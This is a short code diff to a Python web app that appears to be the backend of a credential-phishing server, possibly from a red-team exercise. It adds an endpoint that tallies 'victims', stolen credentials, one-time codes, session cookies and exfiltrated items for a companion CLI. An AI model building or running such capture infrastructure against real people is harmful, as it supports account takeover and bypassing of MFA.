@@ -118,6 +118,22 @@ def stolen():
     return {"count": len(STOLEN), "items": STOLEN}
 
 
+@app.get("/api/summary")
+def api_summary():
+    """Machine-readable capture summary for the kingnet CLI (mission auto-detection)."""
+    sess = _sessions()
+    return JSONResponse({
+        "victims": len(sess),
+        "credentials": sum(1 for s in sess if s.get("creds")),
+        "otps": sum(1 for s in sess if s.get("otp")),
+        "cookies": sum(1 for s in sess if s.get("cookie")),
+        "webauthn_rejected": sum(1 for s in sess if s.get("webauthn")),
+        "exfils": len(STOLEN),
+        "tracks": [{"track": s["track"], "has_cookie": bool(s.get("cookie")),
+                    "user": (s.get("creds") or {}).get("username", "")} for s in sess],
+    })
+
+
 @app.get("/healthz")
 def healthz():
     return {"ok": True}
